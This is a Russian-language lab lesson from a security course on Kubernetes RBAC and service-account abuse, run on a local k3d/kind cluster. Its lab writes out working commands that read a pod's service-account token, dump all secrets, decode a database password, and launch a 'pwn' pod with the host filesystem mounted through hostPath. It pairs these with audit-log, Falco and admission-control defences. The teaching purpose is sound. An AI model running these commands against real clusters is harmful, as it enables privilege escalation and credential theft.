# 16.3 — Kubernetes: RBAC и SA abuse

> **M16 · Этап 3 · 5 ч · 🔴 · артефакт:** `labs/m16-cloud-k8s/l03-k8s/`

## Цель

Понять модель Kubernetes: pod, service account, RBAC, secrets, admission — и найти путь от пода до cluster-admin.

## Результат

- Карта RBAC в кластере.
- Эксплуатация over-permissioned SA.
- Список детектов (audit log).

## Теория

### 1. Объекты

- **Pod** — минимальная единица.
- **ServiceAccount (SA)** — идентичность пода.
- **Role/ClusterRole** — права.
- **RoleBinding/ClusterRoleBinding** — привязка.
- **Secret** — данные (base64, не шифрование).
- **Admission controller** — валидация/мутация.

### 2. Опасные права

- `create pods` → запустить свой pod.
- `get secrets` → читать все секреты.
- `create clusterrolebinding` → выдать себе admin.
- `impersonate` → действовать как другой.
- `pods/exec` → вход в pod.
- `escalate`/`bind` на роли.

### 3. Инструменты

```bash
kubectl auth can-i --list
kubectl get sa -A
kubectl get rolebindings,clusterrolebindings -A
kubectl auth can-i create pods --as system:serviceaccount:default:app
```

`kube-hunter`, `kubescape`, `Peirates` — автоматизация.

### 4. Эксплуатация SA

Если SA имеет права:

```bash
# из пода
cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl --token=$TOKEN get secrets -A
```

Или создайте pod с `hostPath`/privileged (если разрешено).

### 5. Детект

- Audit log: `create pods`, `get secrets`, `create clusterrolebinding`, `exec`.
- Falco: необычные процессы, монтирование, privilege.
- Admission: OPA/Kyverno блокирует privileged/hostPath.

## Лаборатория

> `k3d`/`kind` локально. Кластер `lab`, namespace `default` и `prod`.

### 1. Контекст

```bash
kubectl config current-context
kubectl auth can-i --list
kubectl get pods -A
```

### 2. RBAC

```bash
kubectl get clusterrolebindings -o wide
kubectl get rolebindings -A
kubectl describe clusterrole cluster-admin
```

Ожидаемо: список привязок. Найдите SA с широкими правами.

### 3. SA token

```bash
kubectl create sa app
kubectl run shell --image=alpine --restart=Never --overrides='{"spec":{"serviceAccountName":"app"}}' -- sleep 3600
kubectl exec -it shell -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

Ожидаемо: токен.

### 4. Эскалация

Если SA может создавать pods:

```bash
kubectl --token=$TOKEN auth can-i create pods
kubectl --token=$TOKEN run pwn --image=alpine --restart=Never --overrides='{"spec":{"containers":[{"name":"pwn","image":"alpine","command":["sleep","3600"],"volumeMounts":[{"name":"host","mountPath":"/host"}]}],"volumes":[{"name":"host","hostPath":{"path":"/"}}]}}'
```

Ожидаемо: доступ к хосту (если admission не блокирует).

### 5. Секреты

```bash
kubectl get secrets -A
kubectl get secret db-creds -o jsonpath='{.data.password}' | base64 -d
```

Ожидаемо: пароль. Зафиксируйте.

### 6. Audit

```bash
# для k3d включите audit log или посмотрите события
kubectl get events -A --sort-by=.lastTimestamp | tail -20
```

## Атака и защита

- **Атака:** SA token → API → secrets/эскалация.
- **Детект:** audit log, Falco, события.
- **Фикс:** least privilege RBAC, PSA/restricted, OPA/Kyverno, encryption at rest, short-lived tokens, network policies.

## Самопроверка

- [ ] Чем Role отличается от ClusterRole?
- [ ] Почему `get secrets` опасен?
- [ ] Что такое service account token?
- [ ] Как admission controller мешает escape?
- [ ] Какие события audit log искать?

## Дальше

[16.4 — Container escape и cloud detection](l04-container-cloud-detect.md)
